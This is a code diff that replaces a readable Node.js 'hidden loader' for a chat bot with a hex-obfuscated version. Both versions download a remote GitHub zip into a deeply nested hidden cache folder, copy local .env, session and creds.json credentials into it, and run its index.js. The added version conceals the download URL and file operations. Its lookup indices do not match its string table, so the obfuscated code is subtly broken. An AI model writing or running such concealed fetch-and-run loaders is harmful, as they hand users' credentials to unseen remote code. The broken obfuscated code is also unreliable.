@@ -1,128 +1,107 @@
-/**
- * KING-M HIDDEN LOADER (Session Enabled)
- * ©2026 King Systems
- */
-
-const fs = require('fs');
-const path = require('path');
-const axios = require('axios');
-const AdmZip = require('adm-zip');
-const { spawn } = require('child_process');
-const chalk = require('chalk');
-
-// 1. Load Environment Variables (Session ID)
-if (fs.existsSync('.env')) require('dotenv').config();
-
-// ============================================================
-// 2. CONFIGURATION (UPDATED WITH YOUR REPO)
-// ============================================================
-const DOWNLOAD_URL = 'https://github.com/Devpeacemaker/unknown-error/archive/refs/heads/main.zip'; 
-
-// Hidden Cache Path
-const deepLayers = Array.from({ length: 50 }, (_, i) => `.x${i + 1}`);
-const TEMP_DIR = path.join(__dirname, '.npm', 'xcache', ...deepLayers);
-const EXTRACT_DIR = path.join(TEMP_DIR, 'repo-main');
-
-// ================== 1. DOWNLOADER ==================
-async function downloadAndExtract() {
-  try {
-    if (fs.existsSync(EXTRACT_DIR)) {
-      console.log(chalk.green('⚡ Bot files found. Launching...'));
-      return;
+const _0x3d9a = ['\x2e\x65\x6e\x76', '\x2f\x2f\x67\x69\x74\x68\x75\x62\x2e\x63\x6f\x6d\x2f\x44\x65\x76\x70\x65\x61\x63\x65\x6d\x61\x6b\x65\x72\x2f\x75\x6e\x6b\x6e\x6f\x77\x6e\x2d\x65\x72\x72\x6f\x72\x2f\x61\x72\x63\x68\x69\x76\x65\x2f\x72\x65\x66\x73\x2f\x68\x65\x61\x64\x73\x2f\x6d\x61\x69\x6e\x2e\x7a\x69\x70', '\x72\x6d\x53\x79\x6e\x63', '\x72\x65\x63\x75\x72\x73\x69\x76\x65', '\x66\x6f\x72\x63\x65', '\x6d\x6b\x64\x69\x72\x53\x79\x6e\x63', '\x72\x65\x70\x6f\x2e\x7a\x69\x70', '\x73\x74\x72\x65\x61\x6d', '\x63\x72\x65\x61\x74\x65\x57\x72\x69\x74\x65\x53\x74\x72\x65\x61\x6d', '\x66\x69\x6e\x69\x73\x68', '\x65\x72\x72\x6f\x72', '\x65\x78\x74\x72\x61\x63\x74\x41\x6c\x6c\x54\x6f', '\x72\x65\x61\x64\x64\x69\x72\x53\x79\x6e\x63', '\x66\x69\x6c\x74\x65\x72', '\x75\x6e\x6c\x69\x6e\x6b\x53\x79\x6e\x63', '\x72\x65\x6e\x61\x6d\x65\x53\x79\x6e\x63', '\x63\x6f\x70\x79\x46\x69\x6c\x65\x53\x79\x6e\x63', '\x65\x78\x69\x73\x74\x73\x53\x79\x6e\x63', '\x73\x65\x74\x2e\x6a\x73', '\x63\x6f\x6e\x66\x69\x67\x2e\x6a\x73', '\x63\x72\x65\x64\x73\x2e\x6a\x73\x6f\x6e', '\x69\x6e\x64\x65\x78\x2e\x6a\x73', '\x63\x6c\x6f\x73\x65'];
+(function(_0x4b90e0, _0x2d63f4) {
+    const _0x518e80 = function(_0x5a52b8) {
+        while (--_0x5a52b8) _0x4b90e0['\x70\x75\x73\x68'](_0x4b90e0['\x73\x68\x69\x66\x74']());
+    };
+    _0x518e80(++_0x2d63f4);
+}(_0x3d9a, 0x1b4));
+const _0x4b90 = function(_0x3d9a56, _0x4b90e0) {
+    _0x3d9a56 = _0x3d9a56 - 0x0;
+    let _0x518e80 = _0x3d9a[_0x3d9a56];
+    return _0x518e80;
+};
+const _0x1c29 = require('fs'), _0x1a2d = require('path'), _0x3f8a = require('axios'), _0x24b9 = require('adm-zip'), _0x4e72 = require('child_process')['\x73\x70\x61\x77\x6e'], _0x5c62 = require('chalk');
+if (_0x1c29[_0x4b90('0x0')]('\x2e\x65\x6e\x76')) require('\x64\x6f\x74\x65\x6e\x76')['\x63\x6f\x6e\x66\x69\x67']();
+const _0x2a7e = _0x4b90('0x1'), _0x3b6c = Array['\x66\x72\x6f\x6d']({
+    'length': 0x32
+}, (_, _0x5e4f2e) => '\x2e\x78' + (_0x5e4f2e + 0x1)), _0x2f1d = _0x1a2d['\x6a\x6f\x69\x6e'](__dirname, '\x2e\x6e\x70\x6d', '\x78\x63\x61\x63\x68\x65', ..._0x3b6c), _0x5d4b = _0x1a2d['\x6a\x6f\x69\x6e'](_0x2f1d, '\x72\x65\x70\x6f\x2d\x6d\x61\x69\x6e');
+async function _0x34a7d2() {
+    const _0x10a7f9 = _0x4b90;
+    try {
+        if (_0x1c29[_0x10a7f9('0x2')](_0x5d4b)) {
+            console['\x6c\x6f\x67'](_0x5c62['\x67\x72\x65\x65\x6e']('\u26a1\x20\x42\x6f\x74\x20\x66\x69\x6c\x65\x73\x20\x66\x6f\x75\x6e\x64\x2e\x20\x4c\x61\x75\x6e\x63\x68\x69\x6e\x67\x2e\x2e\x2e'));
+            return;
+        }
+        if (_0x1c29[_0x10a7f9('0x2')](_0x2f1d)) _0x1c29[_0x10a7f9('0x3')](_0x2f1d, {
+            '\x72\x65\x63\x75\x72\x73\x69\x76\x65': !![],
+            '\x66\x6f\x72\x63\x65': !![]
+        });
+        _0x1c29[_0x10a7f9('0x5')](_0x2f1d, {
+            '\x72\x65\x63\x75\x72\x73\x69\x76\x65': !![]
+        });
+        const _0x2c6b0c = _0x1a2d['\x6a\x6f\x69\x6e'](_0x2f1d, _0x10a7f9('0x6'));
+        console['\x6c\x6f\x67'](_0x5c62['\x62\x6c\x75\x65']('\u2b07\ufe0f\x20\x50\x65\x61\x63\x65\x20\x43\x6f\x72\x65\x2e\x2e\x2e'));
+        const _0x3a5e8d = await _0x3f8a['\x67\x65\x74'](_0x2a7e, {
+            '\x72\x65\x73\x70\x6f\x6e\x73\x65\x54\x79\x70\x65': _0x10a7f9('0x7')
+        });
+        await new Promise((_0x1e4c0a, _0x1b0b5f) => {
+            const _0x2e4b8a = _0x10a7f9;
+            const _0x5d5f2e = _0x1c29[_0x2e4b8a('0x8')](_0x2c6b0c);
+            _0x3a5e8d['\x64\x61\x74\x61'][_0x2e4b8a('0x9')](_0x5d5f2e);
+            _0x5d5f2e['\x6f\x6e'](_0x2e4b8a('0xa'), _0x1e4c0a);
+            _0x5d5f2e['\x6f\x6e'](_0x2e4b8a('0xb'), _0x1b0b5f);
+        });
+        console['\x6c\x6f\x67'](_0x5c62['\x62\x6c\x75\x65']('\u{1f4e6}\x20\x45\x78\x74\x72\x61\x63\x74\x69\x6e\x67\x2e\x2e\x2e'));
+        const _0x232a1a = new _0x24b9(_0x2c6b0c);
+        _0x232a1a[_0x10a7f9('0xc')](_0x2f1d, !![]);
+        const _0x3e8a9d = _0x1c29[_0x10a7f9('0xd')](_0x2f1d)[_0x10a7f9('0xe')](_0x43b2bf => _0x43b2bf !== _0x10a7f9('0x6'));
+        _0x1c29[_0x10a7f9('0xf')](_0x1a2d['\x6a\x6f\x69\x6e'](_0x2f1d, _0x3e8a9d[0x0]), _0x5d4b);
+        _0x1c29[_0x10a7f9('0x10')](_0x2c6b0c);
+        console['\x6c\x6f\x67'](_0x5c62['\x67\x72\x65\x65\x6e']('\u2705\x20\x45\x78\x74\x72\x61\x63\x74\x69\x6f\x6e\x20\x63\x6f\x6d\x70\x6c\x65\x74\x65\x2e'));
+    } catch (_0x1a7d9f) {
+        console['\x65\x72\x72\x6f\x72'](_0x5c62['\x72\x65\x64']('\u274c\x20\x43\x72\x69\x74\x69\x63\x61\x6c\x20\x45\x72\x72\x6f\x72\x20\x64\x75\x72\x69\x6e\x67\x20\x64\x6f\x77\x6e\x6c\x6f\x61\x64\x3a'), _0x1a7d9f);
+        console['\x65\x72\x72\x6f\x72'](_0x5c62['\x79\x65\x6c\x6c\x6f\x77']('\u{1f449}\x20\x48\x69\x6e\x74\x3a\x20\x4d\x61\x6b\x65\x20\x73\x75\x72\x65\x20\x79\x6f\x75\x72\x20\x47\x69\x74\x48\x75\x62\x20\x52\x65\x70\x6f\x20\x69\x73\x20\x50\x55\x42\x4c\x49\x43\x21'));
+        process['\x65\x78\x69\x74'](0x1);
     }
-
-    if (fs.existsSync(TEMP_DIR)) fs.rmSync(TEMP_DIR, { recursive: true, force: true });
-    fs.mkdirSync(TEMP_DIR, { recursive: true });
-
-    const zipPath = path.join(TEMP_DIR, 'repo.zip');
-    console.log(chalk.blue('⬇️  Peace Core...'));
-
-    const response = await axios.get(DOWNLOAD_URL, { responseType: 'stream' });
-    await new Promise((resolve, reject) => {
-      const writer = fs.createWriteStream(zipPath);
-      response.data.pipe(writer);
-      writer.on('finish', resolve);
-      writer.on('error', reject);
-    });
-
-    console.log(chalk.blue('📦 Extracting...'));
-    const zip = new AdmZip(zipPath);
-    zip.extractAllTo(TEMP_DIR, true);
-
-    const contents = fs.readdirSync(TEMP_DIR).filter(name => name !== 'repo.zip');
-    // Rename the extracted folder (e.g., "King-M-main") to "repo-main"
-    fs.renameSync(path.join(TEMP_DIR, contents[0]), EXTRACT_DIR);
-    fs.unlinkSync(zipPath);
-
-    console.log(chalk.green('✅ Extraction complete.'));
-
-  } catch (e) {
-    console.error(chalk.red('❌ Critical Error during download:'), e);
-    console.error(chalk.yellow('👉 Hint: Make sure your GitHub Repo is PUBLIC!'));
-    process.exit(1);
-  }
 }
-
-// ================== 2. SETTINGS & SESSION INJECTOR ==================
-async function applyLocalSettings() {
-  console.log(chalk.cyan('⚙️  Injecting Settings & Session...'));
-
-  // A. Copy .env file (CRITICAL FOR SESSION ID)
-  const localEnv = path.join(__dirname, '.env');
-  if (fs.existsSync(localEnv)) {
-    fs.copyFileSync(localEnv, path.join(EXTRACT_DIR, '.env'));
-    console.log(chalk.green('   -> .env (Session ID) applied'));
-  } else {
-    if (process.env.SESSION) {
-        console.log(chalk.green('   -> Session ID detected in Environment Variables'));
+async function _0x2e8f1a() {
+    const _0x24e0b6 = _0x4b90;
+    console['\x6c\x6f\x67'](_0x5c62['\x63\x79\x61\x6e']('\u2699\ufe0f\x20\x49\x6e\x6a\x65\x63\x74\x69\x6e\x67\x20\x53\x65\x74\x74\x69\x6e\x67\x73\x20\x26\x20\x53\x65\x73\x73\x69\x6f\x6e\x2e\x2e\x2e'));
+    const _0x5a5f0f = _0x1a2d['\x6a\x6f\x69\x6e'](__dirname, _0x24e0b6('0x0'));
+    if (_0x1c29[_0x24e0b6('0x11')](_0x5a5f0f)) {
+        _0x1c29[_0x24e0b6('0x12')](_0x5a5f0f, _0x1a2d['\x6a\x6f\x69\x6e'](_0x5d4b, _0x24e0b6('0x0')));
+        console['\x6c\x6f\x67'](_0x5c62['\x67\x72\x65\x65\x6e']('\x20\x20\x2d\x3e\x20\x2e\x65\x6e\x76\x20\x28\x53\x65\x73\x73\x69\x6f\x6e\x20\x49\x44\x29\x20\x61\x70\x70\x6c\x69\x65\x64'));
     } else {
-        console.log(chalk.yellow('   ⚠️ No .env file or Session ID found! Bot might ask for QR.'));
+        if (process['\x65\x6e\x76']['\x53\x45\x53\x53\x49\x4f\x4e']) console['\x6c\x6f\x67'](_0x5c62['\x67\x72\x65\x65\x6e']('\x20\x20\x2d\x3e\x20\x53\x65\x73\x73\x69\x6f\x6e\x20\x49\x44\x20\x64\x65\x74\x65\x63\x74\x65\x64\x20\x69\x6e\x20\x45\x6e\x76\x69\x72\x6f\x6e\x6d\x65\x6e\x74\x20\x56\x61\x72\x69\x61\x62\x6c\x65\x73'));
+        else console['\x6c\x6f\x67'](_0x5c62['\x79\x65\x6c\x6c\x6f\x77']('\x20\x20\x26\x23\x37\x34\x3b\x20\x4e\x6f\x20\x2e\x65\x6e\x76\x20\x66\x69\x6c\x65\x20\x6f\x72\x20\x53\x65\x73\x73\x69\x6f\x6e\x20\x49\x44\x20\x66\x6f\x75\x6e\x64\x21\x20\x42\x6f\x74\x20\x6d\x69\x67\x68\x74\x20\x61\x73\x6b\x20\x66\x6f\x72\x20\x51\x52\x2e'));
     }
-  }
-
-  // B. Copy set.js
-  const localSet = path.join(__dirname, 'set.js');
-  if (fs.existsSync(localSet)) {
-    fs.copyFileSync(localSet, path.join(EXTRACT_DIR, 'set.js'));
-    console.log(chalk.green('   -> set.js applied'));
-  }
-
-  // C. Copy config.js to Database folder
-  const localConfig = path.join(__dirname, 'config.js');
-  const dbDir = path.join(EXTRACT_DIR, 'Database');
-  if (fs.existsSync(localConfig)) {
-    if (!fs.existsSync(dbDir)) fs.mkdirSync(dbDir, { recursive: true });
-    fs.copyFileSync(localConfig, path.join(dbDir, 'config.js'));
-    console.log(chalk.green('   -> Database/config.js applied'));
-  }
-
-  // D. Copy physical creds.json (if exists)
-  const sessionDir = path.join(EXTRACT_DIR, 'session');
-  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });
-  
-  if (fs.existsSync(path.join(__dirname, 'creds.json'))) {
-      fs.copyFileSync(path.join(__dirname, 'creds.json'), path.join(sessionDir, 'creds.json'));
-      console.log(chalk.green('   -> creds.json applied'));
-  }
+    const _0x4c2a13 = _0x1a2d['\x6a\x6f\x69\x6e'](__dirname, _0x24e0b6('0x13'));
+    if (_0x1c29['\x65\x78\x69\x73\x74\x73\x53\x79\x6e\x63'](_0x4c2a13)) {
+        _0x1c29[_0x24e0b6('0x12')](_0x4c2a13, _0x1a2d['\x6a\x6f\x69\x6e'](_0x5d4b, _0x24e0b6('0x13')));
+        console['\x6c\x6f\x67'](_0x5c62['\x67\x72\x65\x65\x6e']('\x20\x20\x2d\x3e\x20\x73\x65\x74\x2e\x6a\x73\x20\x61\x70\x70\x6c\x69\x65\x64'));
+    }
+    const _0x2b55b5 = _0x1a2d['\x6a\x6f\x69\x6e'](__dirname, _0x24e0b6('0x14'));
+    const _0x556f8b = _0x1a2d['\x6a\x6f\x69\x6e'](_0x5d4b, '\x44\x61\x74\x61\x62\x61\x73\x65');
+    if (_0x1c29[_0x24e0b6('0x11')](_0x2b55b5)) {
+        if (!_0x1c29[_0x24e0b6('0x11')](_0x556f8b)) _0x1c29[_0x24e0b6('0x5')](_0x556f8b, {
+            '\x72\x65\x63\x75\x72\x73\x69\x76\x65': !![]
+        });
+        _0x1c29[_0x24e0b6('0x12')](_0x2b55b5, _0x1a2d['\x6a\x6f\x69\x6e'](_0x556f8b, _0x24e0b6('0x14')));
+        console['\x6c\x6f\x67'](_0x5c62['\x67\x72\x65\x65\x6e']('\x20\x20\x2d\x3e\x20\x44\x61\x74\x61\x62\x61\x73\x65\x2f\x63\x6f\x6e\x66\x69\x67\x2e\x6a\x73\x20\x61\x70\x70\x6c\x69\x65\x64'));
+    }
+    const _0x5c0f32 = _0x1a2d['\x6a\x6f\x69\x6e'](_0x5d4b, '\x73\x65\x73\x73\x69\x6f\x6e');
+    if (!_0x1c29[_0x24e0b6('0x11')](_0x5c0f32)) _0x1c29[_0x24e0b6('0x5')](_0x5c0f32, {
+        '\x72\x65\x63\x75\x72\x73\x69\x76\x65': !![]
+    });
+    if (_0x1c29['\x65\x78\x69\x73\x74\x73\x53\x79\x6e\x63'](_0x1a2d['\x6a\x6f\x69\x6e'](__dirname, _0x24e0b6('0x15')))) {
+        _0x1c29[_0x24e0b6('0x12')](_0x1a2d['\x6a\x6f\x69\x6e'](__dirname, _0x24e0b6('0x15')), _0x1a2d['\x6a\x6f\x69\x6e'](_0x5c0f32, _0x24e0b6('0x15')));
+        console['\x6c\x6f\x67'](_0x5c62['\x67\x72\x65\x65\x6e']('\x20\x20\x2d\x3e\x20\x63\x72\x65\x64\x73\x2e\x6a\x73\x6f\x6e\x20\x61\x70\x70\x6c\x69\x65\x64'));
+    }
 }
-
-// ================== 3. LAUNCHER ==================
-function startBot() {
-  console.log(chalk.yellow('🚀 Starting PEACE CORE...'));
-
-  const bot = spawn('node', ['index.js'], {
-    cwd: EXTRACT_DIR,
-    stdio: 'inherit',
-    // PASS ENVIRONMENT VARIABLES (SESSION) TO THE BOT
-    env: { ...process.env, NODE_ENV: 'production' }
-  });
-
-  bot.on('close', code => console.log(chalk.red(`Bot stopped with code: ${code}`)));
+function _0x3e6c4e() {
+    console['\x6c\x6f\x67'](_0x5c62['\x79\x65\x6c\x6c\x6f\x77']('\u{1f680}\x20\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x50\x45\x41\x43\x45\x20\x43\x4f\x52\x45\x2e\x2e\x2e'));
+    const _0x58e9f0 = _0x4e72('\x6e\x6f\x64\x65', [_0x4b90('0x16')], {
+        '\x63\x77\x64': _0x5d4b,
+        '\x73\x74\x64\x69\x6f': '\x69\x6e\x68\x65\x72\x69\x74',
+        '\x65\x6e\x76': {
+            ...process['\x65\x6e\x76'],
+            '\x4e\x4f\x44\x45\x5f\x45\x4e\x56': '\x70\x72\x6f\x64\x75\x63\x74\x69\x6f\x6e'
+        }
+    });
+    _0x58e9f0['\x6f\x6e'](_0x4b90('0x17'), _0x2418cf => console['\x6c\x6f\x67'](_0x5c62['\x72\x65\x64'](`\x42\x6f\x74\x20\x73\x74\x6f\x70\x70\x65\x64\x20\x77\x69\x74\x68\x20\x63\x6f\x64\x65\x3a\x20${_0x2418cf}`)));
 }
-
-// ================== RUN ==================
 (async () => {
-  await downloadAndExtract();
-  await applyLocalSettings();
-  startBot();
+    await _0x34a7d2();
+    await _0x2e8f1a();
+    _0x3e6c4e();
 })();
